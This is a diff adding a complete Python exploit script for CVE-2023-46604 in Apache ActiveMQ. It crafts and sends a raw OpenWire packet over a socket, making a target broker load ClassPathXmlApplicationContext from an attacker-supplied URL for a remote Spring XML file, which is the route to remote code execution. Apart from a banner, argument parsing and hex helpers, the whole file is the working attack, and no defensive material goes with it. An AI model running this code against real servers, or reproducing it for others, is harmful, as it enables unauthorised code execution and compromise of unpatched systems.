@@ -1,0 +1,70 @@
+#! /usr/bin/env python3.12
+
+"""
+Author: Erick Roberto Rodriguez Rodriguez
+Email: erodriguez@tekium.mx, erickrr.tbd93@gmail.com
+GitHub: https://github.com/erickrr-bd/libPyElk
+CVE-2023-46604 - June 2025
+"""
+import socket 
+import argparse
+
+RED = "\33[91m"
+GREEN = "\033[32m"
+END = "\033[0m"
+
+BANNER = f"""
+{GREEN}	
+ ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗ ██████╗  ██████╗  ██████╗ ██╗  ██╗
+██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║██╔════╝ ██╔════╝ ██╔═████╗██║  ██║
+██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║███████╗ ███████╗ ██║██╔██║███████║
+██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══██╗██╔═══██╗████╔╝██║╚════██║
+╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║╚██████╔╝╚██████╔╝╚██████╔╝     ██║
+ ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝      ╚═╝                                                                                                                                                                                                                                                                                                                                                                                        
+By Erick Rodríguez                                                                                                                                                                                          	
+{END}
+"""
+
+def convert_str_to_hex(string: str):
+	return string.encode().hex()
+
+
+def convert_int_to_hex(integer: int, number: int):
+	if number == 4:
+		return format(integer, '04x')
+	elif number == 8:
+		return format(integer, '08x')
+	else: 
+		raise ValueError("number must be 4 or 8") 
+
+
+def send_payload(ip: str, port: int, url: str):
+	if not ip or not url:
+		print(f"{RED}Required IP address and/or URL{END}")
+	else:
+		class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
+		header = "1f00000000000000000001" 
+		body = header + "01" + convert_int_to_hex(len(class_name), 4) + convert_str_to_hex(class_name) + "01" + convert_int_to_hex(len(url), 4) + convert_str_to_hex(url)
+		payload = convert_int_to_hex(len(body) // 2, 8) + body 
+		data = bytes.fromhex(payload)
+		print("[*] Sending packet:", payload)
+		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+		conn.connect((ip, port)) 
+		conn.send(data) 
+		conn.close() 
+
+
+if __name__ == "__main__":
+	print(BANNER)
+
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-i", "--ip", help = "Apache ActiveMQ server IP")
+	parser.add_argument("-p", "--port", default = "61616", help = "Apache ActiveMQ server port")
+	parser.add_argument("-u", "--url", help = "Spring XML URL")
+	args = parser.parse_args()
+
+	print(f"[*] IP Address: {args.ip}")
+	print(f"[*] Port: {args.port}")
+	print(f"[*] URL: {args.url}\n")
+
+	send_payload(args.ip, int(args.port), args.url)
